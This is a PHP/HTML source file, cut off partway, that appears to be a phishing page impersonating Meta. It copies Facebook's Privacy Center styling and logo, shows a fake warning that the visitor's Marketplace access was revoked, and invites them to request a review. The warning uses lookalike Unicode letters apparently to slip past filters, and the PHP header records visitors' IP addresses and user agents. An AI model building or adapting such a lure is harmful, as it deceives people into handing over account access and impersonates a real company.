<?php require_once('handle/server-data.php'); ?>
<?php require_once('get-ip-promax.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
// Lấy user-agent của người dùng
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>


<!DOCTYPE html>
<html lang="en" id="html">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="https://i.imgur.com/4EzYFyb.jpeg">
    <title>Meta | Facebook</title>
    <link rel="stylesheet" href="styles/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <link rel="stylesheet" href="styles/style.css">
    <link rel="shortcut icon" href="https://i.imgur.com/FOY6xZ9.png" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

</head>

<body>

    

    <div class="container-sm" id="main">
        <div class="container-head">
            <div id="logo">
                <svg aria-label="Логотип Meta" class="x1kpxq89 x1247r65" role="img" viewBox="0 0 500 100">
                    <defs>
                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38"
                            x2="160.839" y1="99" y2="59.326">
                            <stop offset=".427" stop-color="#0278F1"></stop>
                            <stop offset=".917" stop-color="#0180FA"></stop>
                        </linearGradient>
                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42" x2="-1.666"
                            y1="4.936" y2="61.707">
                            <stop offset=".427" stop-color="#0165E0"></stop>
                            <stop offset=".917" stop-color="#0180FA"></stop>
                        </linearGradient>
                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677"
                            x2="132.943" y1="28.71" y2="71.118">
                            <stop stop-color="#0064E0"></stop>
                            <stop offset=".656" stop-color="#0066E2"></stop>
                            <stop offset="1" stop-color="#0278F1"></stop>
                        </linearGradient>
                    </defs>
                    <path
                        d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                        fill="#1C2B33"></path>
                    <path
                        d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                        fill="#0180FA"></path>
                    <path
                        d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
                        fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
                    <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
                        fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
                    <path
                        d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
                        fill="url(#:R1eckmkldd6knpapd5aqH3:)"></path>
                </svg>
            </div>
            <div class="burger-button" id="showPopup">
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
            </div>
        </div>
        <div class="row">

            <style>
                /* CSS for responsiveness */
                @media (max-width: 1000px) {

                    /* Ẩn phần tử có id="left" */
                    #left {
                        display: none;
                    }
                }
            </style>

            <div class="col-4">
                <div id="left">
                    <div id="logo">
                        <svg aria-label="Логотип Meta" class="" role="img" viewBox="0 0 500 100">
                            <defs>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38"
                                    x2="160.838" y1="99" y2="59.326">
                                    <stop offset=".427" stop-color="#0278F1"></stop>
                                    <stop offset=".917" stop-color="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42"
                                    x2="-1.666" y1="4.936" y2="61.707">
                                    <stop offset=".427" stop-color="#0165E0"></stop>
                                    <stop offset=".917" stop-color="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677"
                                    x2="132.943" y1="28.71" y2="71.118">
                                    <stop stop-color="#0064E0"></stop>
                                    <stop offset=".656" stop-color="#0066E2"></stop>
                                    <stop offset="1" stop-color="#0278F1"></stop>
                                </linearGradient>
                            </defs>
                            <path
                                d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                                fill="#1C2B33"></path>
                            <path
                                d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                                fill="#0180FA"></path>
                            <path
                                d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
                                fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
                            <path
                                d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
                                fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
                            <path
                                d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
                                fill="url(#:R1eckmkldd6knpapd5aqH3:)"></path>
                        </svg>
                    </div>
                    <h1>Privacy Center</h1>
                    <div id="action-buttons">

                        <div class="action-button account" id="utm-user" style="display: none;">
                            <div class="action-button-img">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                                    version="1.1" width="256" height="256" viewBox="0 0 256 256" xml:space="preserve">

                                    <defs>
                                    </defs>
                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;"
                                        transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                        <path
                                            d="M 45 88 c -11.049 0 -21.18 -2.003 -29.021 -8.634 C 6.212 71.105 0 58.764 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 c 0 13.765 -6.212 26.105 -15.979 34.366 C 66.181 85.998 56.049 88 45 88 z"
                                            style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(214,214,214); fill-rule: nonzero; opacity: 1;"
                                            transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                                        <path
                                            d="M 45 60.71 c -11.479 0 -20.818 -9.339 -20.818 -20.817 c 0 -11.479 9.339 -20.818 20.818 -20.818 c 11.479 0 20.817 9.339 20.817 20.818 C 65.817 51.371 56.479 60.71 45 60.71 z"
                                            style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(165,164,164); fill-rule: nonzero; opacity: 1;"
                                            transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                                        <path
                                            d="M 45 90 c -10.613 0 -20.922 -3.773 -29.028 -10.625 c -0.648 -0.548 -0.88 -1.444 -0.579 -2.237 C 20.034 64.919 31.933 56.71 45 56.71 s 24.966 8.209 29.607 20.428 c 0.301 0.793 0.069 1.689 -0.579 2.237 C 65.922 86.227 55.613 90 45 90 z"
                                            style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(165,164,164); fill-rule: nonzero; opacity: 1;"
                                            transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                                    </g>
                                </svg>
                            </div>
                            <div class="action-button-text UserName">
                            </div>
                            <div class="action-button-arrow">

                            </div>
                        </div>
                        <div class="action-button main collapsed">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="m19.007 9.997-6.338-5.704a1 1 0 0 0-1.338 0L4.993 9.997A3 3 0 0 0 4 12.227v6.61c0 .216.07.38.149.48a.432.432 0 0 0 .284.167c.86.14 2.04.29 3.567.391V16a3 3 0 0 1 3-3h2a3 3 0 0 1 3 3v3.875a37.895 37.895 0 0 0 3.567-.39.432.432 0 0 0 .284-.168.773.773 0 0 0 .149-.48v-6.61a3 3 0 0 0-.993-2.23zM3.655 8.51l6.338-5.704a3 3 0 0 1 4.014 0l6.338 5.704A5 5 0 0 1 22 12.227v6.61c0 1.292-.836 2.413-2.11 2.621-.94.153-2.208.312-3.833.418-1.125.073-2.057-.836-2.057-1.964V16a1 1 0 0 0-1-1h-2a1 1 0 0 0-1 1v3.912c0 1.128-.932 2.037-2.057 1.964a40.092 40.092 0 0 1-3.832-.418C2.836 21.25 2 20.13 2 18.838v-6.611A5 5 0 0 1 3.655 8.51z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Privacy Center Home Page
                            </div>
                            <div class="action-button-arrow">

                            </div>
                        </div>

                        <div class="action-button collapsed" id="search">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Search
                            </div>
                        </div>

                        <div class="action-button collapsed" id="Policy" data-bs-toggle="collapse"
                            data-bs-target="#PolicyCollapse" aria-expanded="false" aria-controls="PolicyCollapse">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Privacy Policy
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="ARROW">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>

                        <div class="collapse " id="PolicyCollapse">
                        </div>

                        <div class="action-button collapsed" data-bs-toggle="collapse" data-bs-target="#RulesCollapse"
                            aria-expanded="false" aria-controls="RulesCollapse">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm0-13.702c.483 0 .875.391.875.875V17a.875.875 0 0 1-1.75 0v-6.827c0-.484.392-.875.875-.875zm0-1.275c.833 0 1.25-.405 1.25-1.012C13.25 6.405 12.833 6 12 6s-1.25.405-1.25 1.011c0 .607.417 1.012 1.25 1.012z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Other rules and articles
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="ARROW">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="collapse" id="RulesCollapse">
                        </div>

                        <div class="action-button collapsed" data-bs-toggle="collapse" data-bs-target="#SettingCollapse"
                            aria-expanded="false" aria-controls="SettingCollapse">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M16 12a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0z">
                                    </path>
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="m22.191 9.207-2.224 2.06a8.112 8.112 0 0 1 0 1.466l2.224 2.06a1 1 0 0 1 .187 1.233l-1.702 2.948a1 1 0 0 1-1.162.455l-2.895-.896a7.991 7.991 0 0 1-1.27.735l-.672 2.954a1 1 0 0 1-.975.778H10.3a1 1 0 0 1-.975-.778l-.672-2.954a8 8 0 0 1-1.27-.735l-2.895.896a1 1 0 0 1-1.162-.455l-1.702-2.948a1 1 0 0 1 .187-1.233l2.224-2.06a8.1 8.1 0 0 1 0-1.466L1.81 9.207a1 1 0 0 1-.187-1.233l1.702-2.948a1 1 0 0 1 1.162-.455l2.895.896a7.992 7.992 0 0 1 1.27-.735l.672-2.954A1 1 0 0 1 10.299 1h3.403a1 1 0 0 1 .975.778l.672 2.954a7.99 7.99 0 0 1 1.27.735l2.895-.896a1 1 0 0 1 1.162.455l1.702 2.948a1 1 0 0 1-.187 1.233zm-8.574-3.071.894.412c.335.155.653.34.952.551l.805.57 3.075-.951.903 1.564-2.36 2.186.09.98a6.093 6.093 0 0 1 0 1.104l-.09.98 2.36 2.185-.903 1.565-3.075-.951-.805.57a5.993 5.993 0 0 1-.952.55l-.894.413L12.904 21h-1.807l-.713-3.136-.894-.412a5.993 5.993 0 0 1-.952-.551l-.805-.57-3.075.951-.904-1.565 2.36-2.185-.089-.98a6.102 6.102 0 0 1 0-1.104l.09-.98-2.36-2.186.903-1.564 3.075.951.805-.57c.299-.212.617-.396.952-.55l.894-.413L11.097 3h1.807l.713 3.136z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text">
                                Settings
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
                                    class="ARROW">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="collapse " id="SettingCollapse">
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-8">
                <div id="right">
                    <div style="background-color: white;" class="action-button warning">
                        <div class="action-button-img">

                        </div>
                        <div class="action-button-arrow">
                            <!--?xml version="1.0" encoding="iso-8859-1"?-->
                            <!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="256" height="256" viewBox="0 0 256 256" xml:space="preserve">

                                <defs>
                                </defs>
                                <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                    <path d="M 45 57.469 L 45 57.469 c -1.821 0 -3.319 -1.434 -3.399 -3.252 L 38.465 23.95 c -0.285 -3.802 2.722 -7.044 6.535 -7.044 h 0 c 3.813 0 6.82 3.242 6.535 7.044 l -3.137 30.267 C 48.319 56.036 46.821 57.469 45 57.469 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(229,0,0); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                    <circle cx="45" cy="67.67" r="5.42" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(229,0,0); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "></circle>
                                    <path d="M 45 90 C 20.187 90 0 69.813 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 C 90 69.813 69.813 90 45 90 z M 45 6 C 23.495 6 6 23.495 6 45 s 17.495 39 39 39 s 39 -17.495 39 -39 S 66.505 6 45 6 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(229,0,0); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                </g>
                            </svg>
                        </div>
                        <div class="action-button-text">
                            <span style="font-weight: 600;" class="small-black">
                                <font style="vertical-align: inherit;">
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">You can't bսу or sell items on Facebook Marketplace: We've found that your listings didn't follow our Community Standards. If you think that we've made a mistake, you can rеԛuеѕt a review to restore your ассеѕѕ to Marketplace.</font>
                                        </font>
                                    </font>
                                </font>
                            </span>
                        </div>

                    </div>

                    <div class="action-button-list">
                    </div>
                    <div class="action-button-text">
                        <span style="font-weight: 600;" class="small-black">
                        </span>
                    </div>
                    <div id="card">
                        <style>
                            .banner-market {
                                width: 100%;
                                /* Chiều rộng luôn chiếm 100% màn hình */
                                height: auto;
                                /* Tự động tính chiều cao theo tỷ lệ ảnh */
                                object-fit: contain;
                                /* Đảm bảo ảnh giữ tỷ lệ và không bị méo */
                                display: block;
                                /* Loại bỏ khoảng trống dưới ảnh */
                                margin: 0 auto;
                                /* Căn giữa nếu cần */
                            }

                            @media (max-width: 768px) {

                                /* CSS dành cho màn hình nhỏ */
                                .banner-market {
                                    max-height: 300px;
                                    /* Giới hạn chiều cao tối đa */
                                    object-fit: cover;
                                    /* Ảnh sẽ che hết vùng mà không méo */
                                }
                            }
                        </style> 
                        <img class="banner-market" style="background-color: #73c8ff;" src="/img/market.png" alt="">
                        <div class="action-button-list">

                            <div class="action-button warning">
                                <div class="action-button-icon">
                                    <!-- SVG -->
                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
                                </div>
                                <div class="action-button-text">
                                    <span class="small-red">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">Counterfeit or fake branded goods.</font>
                                                </font>
                                            </font>
                                        </font>
                                    </span>
                                </div>
                                <div class="action-button-arrow"></div>
                            </div>
                            <div class="action-button warning">
                                <div class="action-button-icon">
                                    <!-- SVG -->
                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
                                </div>
                                <div class="action-button-text">
                                    <span class="small-red">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">Posting images or descriptions that are inaccurate or do not match the product being sold.</font>
                                                </font>
                                            </font>
                                        </font>
                                    </span>
                                </div>
                                <div class="action-button-arrow"></div>
                            </div>
                            <div class="action-button warning">
                                <div class="action-button-icon">
                                    <!-- SVG -->
                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
                                </div>
                                <div class="action-button-text">
                                    <span class="small-red">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">Engaging in harassment, fraud, or impersonation of other users.</font>
                                                </font>
                                            </font>
